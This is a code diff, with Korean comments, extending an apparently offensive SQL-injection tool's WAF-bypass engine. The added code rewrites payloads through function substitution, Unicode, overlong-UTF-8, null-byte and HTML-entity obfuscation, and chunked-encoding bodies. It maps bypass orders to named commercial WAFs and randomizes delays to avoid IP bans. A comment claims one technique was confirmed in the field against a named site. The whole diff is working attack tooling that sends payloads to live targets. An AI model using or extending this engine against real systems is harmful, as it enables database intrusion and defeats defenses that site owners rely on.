@@ -168,6 +168,98 @@ class WafBypassLib:
         "application/xml",
     ]
 
+    # ── SQL 함수 대체 (IF/SLEEP/BENCHMARK 차단 시) ─────────────
+    # WAF가 SLEEP, IF, BENCHMARK 함수명 자체를 차단할 때 사용
+    FUNCTION_BYPASSES = [
+        # IF(a,b,c) → CASE WHEN a THEN b ELSE c END
+        ("case_when",
+         lambda s: re.sub(
+             r'\bIF\s*\(\s*(.+?)\s*,\s*(.+?)\s*,\s*(.+?)\s*\)',
+             lambda m: f"CASE/**/WHEN/**/{m.group(1)}/**/THEN/**/{m.group(2)}/**/ELSE/**/{m.group(3)}/**/END",
+             s, flags=re.I
+         )),
+        # SLEEP(n) → 무거운 서브쿼리로 타이밍 발생 (함수명 없음)
+        ("heavy_subquery",
+         lambda s: re.sub(
+             r'\bSLEEP\s*\(\s*(\d+)\s*\)',
+             lambda m: (
+                 f"(SELECT/**/1/**/FROM/**/"
+                 f"(SELECT/**/count(*)/**/FROM/**/information_schema.columns/**/A,"
+                 f"information_schema.columns/**/B)x)"
+             ),
+             s, flags=re.I
+         )),
+        # BENCHMARK(n,expr) → 동일하게 무거운 서브쿼리 대체
+        ("benchmark_sub",
+         lambda s: re.sub(
+             r'\bBENCHMARK\s*\(\s*\d+\s*,\s*.+?\s*\)',
+             "(SELECT/**/count(*)/**/FROM/**/information_schema.columns/**/A,"
+             "information_schema.columns/**/B)",
+             s, flags=re.I
+         )),
+        # GREATEST(a,b) 활용 — OR/AND 비교 대체
+        ("greatest_least",
+         lambda s: re.sub(
+             r'\b(\d+)\s*=\s*(\d+)\b',
+             lambda m: (
+                 f"GREATEST({m.group(1)},{m.group(2)})={m.group(2)}"
+                 if m.group(1) == m.group(2)
+                 else f"GREATEST({m.group(1)},{m.group(2)})!={min(m.group(1), m.group(2))}"
+             ),
+             s
+         )),
+        # AND → &&,  OR → ||  (키워드 자체 차단 시)
+        ("logical_operator",
+         lambda s: re.sub(r'\bAND\b', '&&', re.sub(r'\bOR\b', '||', s, flags=re.I), flags=re.I)),
+        # UNION SELECT → UNION(개행)SELECT
+        ("union_newline",
+         lambda s: re.sub(r'\bUNION\s+SELECT\b', 'UNION%0aSELECT', s, flags=re.I)),
+    ]
+
+    # ── Unicode 변형 (고급) ──────────────────────────────────────
+    # WAF가 ASCII 키워드를 탐지하지만 Unicode 정규화를 놓칠 때
+    UNICODE_BYPASSES = [
+        # 전각 문자 (Full-width) — 일부 WAF가 정규화 처리
+        ("fullwidth_quote",   lambda s: s.replace("'", "\uff07").replace('"', "\uff02")),
+        # Overlong UTF-8 인코딩 (레거시 파서 우회)
+        ("overlong_slash",    lambda s: s.replace("/", "%c0%af")),
+        # NULL 바이트 삽입 (C기반 파서 혼동)
+        ("null_byte_inject",  lambda s: re.sub(r'\b(SELECT|UNION|AND|OR)\b',
+                                               lambda m: m.group() + "%00", s, flags=re.I)),
+        # HTML 엔티티 인코딩
+        ("html_entity_sel",   lambda s: s.replace("SELECT", "S&#69;LECT")
+                                         .replace("UNION", "UNI&#79;N")
+                                         .replace("AND", "AN&#68;")),
+    ]
+
+    # ── HTTP Chunked Transfer Encoding 우회 ─────────────────────
+    # Transfer-Encoding: chunked 로 분할 전송 → 일부 WAF 패턴 매칭 무력화
+    @staticmethod
+    def build_chunked_body(data: str, chunk_size: int = 3) -> tuple[bytes, dict]:
+        """
+        POST body를 chunked transfer encoding으로 분할.
+        반환: (chunked_bytes, headers)
+        WAF가 전체 body를 재조합하지 않으면 패턴 탐지 실패.
+        """
+        body = data.encode("utf-8")
+        chunks = [body[i:i+chunk_size] for i in range(0, len(body), chunk_size)]
+        chunked = b""
+        for chunk in chunks:
+            chunked += f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n"
+        chunked += b"0\r\n\r\n"
+        headers = {
+            "Transfer-Encoding": "chunked",
+            "Content-Type": "application/x-www-form-urlencoded",
+        }
+        return chunked, headers
+
+    # ── 요청 속도 제어 (IP 밴 방지) ────────────────────────────
+    # 요청 간격을 랜덤하게 조절해서 WAF/IPS 자동 밴 회피
+    @staticmethod
+    def safe_delay(min_sec: float = 1.0, max_sec: float = 3.5) -> None:
+        """랜덤 딜레이 — 고속 스캔 패턴 탐지 방지"""
+        time.sleep(random.uniform(min_sec, max_sec))
+
 
 # ══════════════════════════════════════════════════════════════
 # WAF Detector
@@ -241,18 +333,35 @@ class WafDetector:
 
     def _make_result(self, waf_type: str, confidence: str, evidence: str,
                      status: int) -> WafDetectResult:
-        # WAF 종류별 우선 우회 전략
+        # WAF 종류별 우선 우회 전략 — 실전 + 고급 기법 포함
         priority_map = {
-            "cloudflare":       ["header", "ua", "encoding", "space"],
-            "nginx_openresty":  ["newline", "mysql_comment", "space", "keyword"],  # 실전 경험!
-            "modsecurity":      ["space", "keyword", "encoding", "header"],
-            "aws_waf":          ["encoding", "header", "space", "keyword"],
-            "generic":          ["space", "keyword", "header", "encoding"],
+            # Cloudflare: 더블인코딩, UA, Unicode 우선
+            "cloudflare":       ["encoding", "unicode", "ua", "header", "space", "function"],
+            # Nginx/OpenResty: 줄바꿈·주석 공백 우선 (urimoney 실전 확인)
+            "nginx_openresty":  ["newline", "mysql_comment", "space", "keyword", "function"],
+            # ModSecurity: 공백 다양화, 함수 대체
+            "modsecurity":      ["space", "function", "keyword", "encoding", "header"],
+            # AWS WAF: 인코딩, 헤더, 함수 대체
+            "aws_waf":          ["encoding", "function", "header", "space", "keyword"],
+            # Sucuri: UA, 헤더 위장
+            "sucuri":           ["ua", "header", "encoding", "space"],
+            # Akamai: 인코딩, 공백, 헤더
+            "akamai":           ["encoding", "header", "space", "unicode"],
+            # F5 BIG-IP: 공백, 키워드
+            "f5_bigip":         ["space", "keyword", "encoding", "function"],
+            # FortiWeb: 공백, 함수
+            "fortiweb":         ["space", "function", "keyword", "header"],
+            # 중국계 WAF (Safe3, D盾): 유니코드, 인코딩, 함수
+            "safe3":            ["unicode", "encoding", "function", "space"],
+            "d_shield":         ["unicode", "encoding", "function", "space"],
+            "yunsuo":           ["unicode", "encoding", "function", "space"],
+            # 범용
+            "generic":          ["space", "keyword", "header", "encoding", "function"],
         }
         return WafDetectResult(
             detected=True, waf_type=waf_type, confidence=confidence,
             evidence=f"{evidence} (HTTP {status})",
-            bypass_priority=priority_map.get(waf_type, ["space", "keyword", "header"]),
+            bypass_priority=priority_map.get(waf_type, ["space", "keyword", "header", "function"]),
         )
 
 
@@ -330,11 +439,7 @@ class WafBypassEngine:
         waf_type: str,
     ) -> tuple[bool, BypassAttempt | None]:
 
-        if strategy == "newline" or strategy == "mysql_comment":
-            # urimoney에서 검증된 공백 우회
-            return self._try_space_bypass(url, payload, method, param, post_data)
-
-        elif strategy == "space":
+        if strategy in ("newline", "mysql_comment", "space"):
             return self._try_space_bypass(url, payload, method, param, post_data)
 
         elif strategy == "keyword":
@@ -348,6 +453,16 @@ class WafBypassEngine:
 
         elif strategy == "ua":
             return self._try_ua_bypass(url, payload, method, param, post_data)
+
+        # ── 신규 고급 기법 ────────────────────────────────────────
+        elif strategy == "function":
+            return self._try_function_bypass(url, payload, method, param, post_data)
+
+        elif strategy == "unicode":
+            return self._try_unicode_bypass(url, payload, method, param, post_data)
+
+        elif strategy == "chunked":
+            return self._try_chunked_bypass(url, payload, method, param, post_data)
 
         return False, None
 
@@ -431,8 +546,121 @@ class WafBypassEngine:
             time.sleep(0.15)
         return False, None
 
+    def _try_function_bypass(self, url, payload, method, param, post_data):
+        """
+        [신규] SQL 함수 대체 우회:
+        IF → CASE WHEN, SLEEP → heavy subquery, BENCHMARK → subquery,
+        GREATEST/LEAST 비교, AND/OR → &&/||, UNION SELECT → UNION%0aSELECT
+        """
+        for name, transform in WafBypassLib.FUNCTION_BYPASSES:
+            try:
+                modified = transform(payload)
+            except Exception:
+                continue
+            if modified == payload:
+                continue  # 변환 없으면 건너뜀
+            r = self._send(url, modified, method, param, post_data)
+            if self._is_bypassed(r):
+                return True, BypassAttempt(
+                    technique=f"function:{name}",
+                    payload_original=payload, payload_modified=modified,
+                    headers_used={}, response_status=r.status,
+                    response_body_preview=r.body[:100],
+                    bypassed=True,
+                )
+            WafBypassLib.safe_delay(0.5, 1.5)
+        return False, None
+
+    def _try_unicode_bypass(self, url, payload, method, param, post_data):
+        """
+        [신규] Unicode/Overlong/HTML 엔티티 우회:
+        전각 문자, Overlong UTF-8, NULL 바이트 삽입, HTML 엔티티
+        """
+        for name, transform in WafBypassLib.UNICODE_BYPASSES:
+            try:
+                modified = transform(payload)
+            except Exception:
+                continue
+            if modified == payload:
+                continue
+            r = self._send(url, modified, method, param, post_data)
+            if self._is_bypassed(r):
+                return True, BypassAttempt(
+                    technique=f"unicode:{name}",
+                    payload_original=payload, payload_modified=modified,
+                    headers_used={}, response_status=r.status,
+                    response_body_preview=r.body[:100],
+                    bypassed=True,
+                )
+            time.sleep(0.2)
+        return False, None
+
+    def _try_chunked_bypass(self, url, payload, method, param, post_data):
+        """
+        [신규] HTTP Chunked Transfer Encoding 우회:
+        POST body를 3~7 바이트씩 분할 전송
+        WAF가 재조합 없이 패턴 검사하면 탐지 실패
+        """
+        if method.upper() != "POST":
+            return False, None  # POST 전용
+        try:
+            import socket as _socket
+
+            # post_data 합치기
+            data = dict(post_data or {})
+            data[param] = payload
+            body_str = urllib.parse.urlencode(data)
+
+            # chunk 크기를 3, 5, 7 순으로 시도
+            from urllib.parse import urlparse as _up
+            parsed = _up(url)
+            host = parsed.hostname or ""
+            port = parsed.port or (443 if parsed.scheme == "https" else 80)
+            path = parsed.path or "/"
+            if parsed.query:
+                path += "?" + parsed.query
+
+            for chunk_size in (3, 5, 7, 1):
+                chunked_body, ch_headers = WafBypassLib.build_chunked_body(body_str, chunk_size)
+                # requests 는 chunked raw 전송 미지원 → httpx 또는 raw socket
+                # 여기서는 httpx를 선택적으로 사용
+                try:
+                    import httpx
+                    with httpx.Client(verify=False, timeout=12) as client:
+                        resp = client.post(
+                            url,
+                            content=chunked_body,
+                            headers=ch_headers,
+                        )
+                    status = resp.status_code
+                    body = resp.text[:200]
+                    headers_r: dict = dict(resp.headers)
+                except ImportError:
+                    return False, None
+
+                # WAF 우회 판정
+                if status not in (403, 406, 501, 503):
+                    blocked_kw = ["access denied", "forbidden", "blocked",
+                                  "not acceptable", "security violation"]
+                    if not any(k in body.lower() for k in blocked_kw):
+                        return True, BypassAttempt(
+                            technique=f"chunked:chunk_size={chunk_size}",
+                            payload_original=payload, payload_modified=body_str,
+                            headers_used=ch_headers, response_status=status,
+                            response_body_preview=body[:100],
+                            bypassed=True,
+                        )
+                WafBypassLib.safe_delay(0.5, 1.2)
+        except Exception:
+            pass
+        return False, None
+
     def _try_combined(self, url, payload, method, param, post_data):
-        """공백 + 키워드 + 헤더 조합"""
+        """
+        [강화] 공백 + 키워드 + 헤더 + 함수대체 + 유니코드 조합
+        기존 단일 기법 실패 후 다층 조합으로 시도
+        """
+        # 1차: 공백 + 키워드 + 헤더 (기존)
         for sp_name, sp_fn in WafBypassLib.SPACE_BYPASSES[:4]:
             for kw_name, kw_fn in WafBypassLib.KEYWORD_BYPASSES[:3]:
                 for hdr_name, headers in WafBypassLib.HEADER_BYPASSES[:3]:
@@ -450,7 +678,52 @@ class WafBypassEngine:
                             response_body_preview=r.body[:100],
                             bypassed=True,
                         )
-                    time.sleep(0.15)
+                    WafBypassLib.safe_delay(0.3, 0.8)
+
+        # 2차: [신규] 함수 대체 + 공백 + 헤더 조합
+        self.log("  [WAF] 함수 대체 + 공백 조합 시도...")
+        for fn_name, fn_fn in WafBypassLib.FUNCTION_BYPASSES[:4]:
+            for sp_name, sp_fn in WafBypassLib.SPACE_BYPASSES[:3]:
+                for hdr_name, headers in WafBypassLib.HEADER_BYPASSES[:3]:
+                    try:
+                        modified = sp_fn(fn_fn(payload))
+                    except Exception:
+                        continue
+                    if modified == payload:
+                        continue
+                    r = self._send(url, modified, method, param, post_data,
+                                   extra_headers=headers)
+                    if self._is_bypassed(r):
+                        return True, BypassAttempt(
+                            technique=f"combined_adv:{fn_name}+{sp_name}+{hdr_name}",
+                            payload_original=payload, payload_modified=modified,
+                            headers_used=headers, response_status=r.status,
+                            response_body_preview=r.body[:100],
+                            bypassed=True,
+                        )
+                    WafBypassLib.safe_delay(0.4, 1.0)
+
+        # 3차: [신규] Unicode + 함수 대체 조합
+        self.log("  [WAF] Unicode + 함수 대체 조합 시도...")
+        for uni_name, uni_fn in WafBypassLib.UNICODE_BYPASSES[:3]:
+            for fn_name, fn_fn in WafBypassLib.FUNCTION_BYPASSES[:3]:
+                try:
+                    modified = uni_fn(fn_fn(payload))
+                except Exception:
+                    continue
+                if modified == payload:
+                    continue
+                r = self._send(url, modified, method, param, post_data)
+                if self._is_bypassed(r):
+                    return True, BypassAttempt(
+                        technique=f"combined_uni:{uni_name}+{fn_name}",
+                        payload_original=payload, payload_modified=modified,
+                        headers_used={}, response_status=r.status,
+                        response_body_preview=r.body[:100],
+                        bypassed=True,
+                    )
+                WafBypassLib.safe_delay(0.3, 0.9)
+
         return False, None
 
     # ── 내부 헬퍼 ────────────────────────────────────────────────
@@ -519,7 +792,30 @@ ModSecurity WAF 우회 전략:
 3. X-Forwarded-For: 127.0.0.1
 4. URL 더블 인코딩
 5. 대소문자 혼합
-6. HEX 인코딩: 0x41 대신 A""",
+6. HEX 인코딩: 0x41 대신 A
+[고급] 7. IF → CASE WHEN (함수 차단 시)
+[고급] 8. SLEEP → 무거운 서브쿼리 (timing 유지)
+[고급] 9. HTTP Chunked 분할 전송""",
+
+            "_advanced": """
+[고급 기법 전체 목록]
+─── SQL 함수 대체 ───
+• IF(a,b,c) → CASE/**/WHEN/**/a/**/THEN/**/b/**/ELSE/**/c/**/END
+• SLEEP(n)  → 무거운 서브쿼리 (information_schema 대규모 조인)
+• BENCHMARK → 동일 서브쿼리 대체
+• GREATEST(a,b) 활용 — = 비교 없이 최댓값 비교
+• AND/OR → &&/|| (키워드 차단 시)
+• UNION SELECT → UNION%0aSELECT
+
+─── Unicode/인코딩 고급 ───
+• 전각 문자: ' → \uff07  " → \uff02
+• Overlong UTF-8: / → %c0%af
+• NULL 바이트: UNION%00SELECT
+• HTML 엔티티: S&#69;LECT, UNI&#79;N
+
+─── HTTP 프로토콜 ───
+• Chunked Transfer: body를 3~7 byte씩 분할 전송
+• 단일 기법 실패 → 함수대체+공백+헤더 3중 조합 자동 시도""",
         }
         return summaries.get(waf_type, summaries["generic"])
 
